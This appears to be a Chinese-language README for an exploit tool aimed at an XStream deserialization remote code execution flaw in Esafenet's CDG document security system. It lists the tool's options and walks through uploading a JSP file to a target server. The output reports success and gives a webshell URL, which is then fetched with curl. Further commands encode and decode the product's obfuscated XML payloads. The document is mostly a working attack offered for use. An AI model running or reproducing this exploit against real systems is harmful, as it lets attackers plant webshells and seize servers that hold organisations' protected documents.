# CDGXStreamDeserRCE

> 亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全防护软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产。亿赛通电子文档安全管理系统存在XStream反序列化远程代码执行漏洞，攻击者可利用该漏洞对服务器上传任意文件，进而控制服务器权限。


## 使用

帮助信息

```bash
$ java -jar CDGXStreamDeserRCE.jar   
亿赛通电子文档安全管理系统XStream反序列化漏洞任意文件上传利用

usage: Options
 -d,--decode <arg>         密文解码
 -e,--encode <arg>         加密XML反序列化payload
 -h,--help                 打印帮助信息
 -p,--proxy <arg>          代理地址
 -t,--target <arg>         目标URL
 -uf,--upload-file <arg>    上传文件的本地路径
```

文件上传利用

```bash
$ cat test1.jsp
<%
out.println("e165421110ba030e165421110ba03099a1c0393373c5b4399a1c0393373c5b43");
%>
$ java -jar CDGXStreamDeserRCE.jar -p http://127.0.0.1:8080 -uf test1.jsp -t https://192.168.31.190:8443
[+] Exploit Successed
[+] WebShell: https://192.168.31.190:8443/CDGServer3/test1.jsp
$ curl -k https://192.168.31.190:8443/CDGServer3/test1.jsp
e165421110ba030e165421110ba03099a1c0393373c5b4399a1c0393373c5b43
```

密文解码，读取文件内容进行解码或直接对字符串进行解码。

```bash
$ java -jar CDGXStreamDeserRCE.jar -d e.txt
<?xml version='1.0' encoding="gb2312"?>
<CDGAuthoriseTemplet>
  <authoriseTempletList>
    <AuthoriseTemplet>
      <name>SystemAdmin</name>
      <description>3FF8A0978
....
```

```bash
$ java -jar CDGXStreamDeserRCE.jar -d FEPCCCLCENHIPOAFPAPDDFCGEAPNMDBMOJPMJAKKNPHOKIKIDCBPHEGKLDGNHCBDEIMODEKMKPFBAIMMNLOJJKMIICLAPJAAFGNGAKFBMPKPJMOIKODEJJMHJCCHKBMFMMFDLOMDPABOJCEAPOFDCPMKGDHFNBBIMCIPAMMIIANFPAJHFAABLLLANNIDAGNKOHONJGFGBKHFDMCLJIMICBHBJEIAAIMACN
<?xml version='1.0' encoding="gb2312"?>
<SystemReturn>
  <returnMessage>Error1200</returnMessage>
</SystemReturn>
```

明文编码，读取文件内容进行编码或直接对字符串进行编码。

```bash
$ java -jar CDGXStreamDeserRCE.jar -e payload.xml

```
```bash
$ java -jar CDGXStreamDeserRCE.jar -e "C:\Program Files (x86)\ESAFENET\CDocGuard Server\tomcat64\webapps\CDGServer3"
BCBILAKIDOOOCGKJDBBFOCGJFGFJPNJALCHEBLGLBFAMKDDLPBCFFJCJHOPGLEACMIOHIFJAGCBPOMIKLMGBAGCNBGEGNKGALLCGLOJNJBHCLMNNGHHJJNAAKPMEDFJDGCEMDADGDCEFFCGEGNFLGHCH
```

## 参考

- https://github.com/woodpecker-framework/ysoserial-for-woodpecker
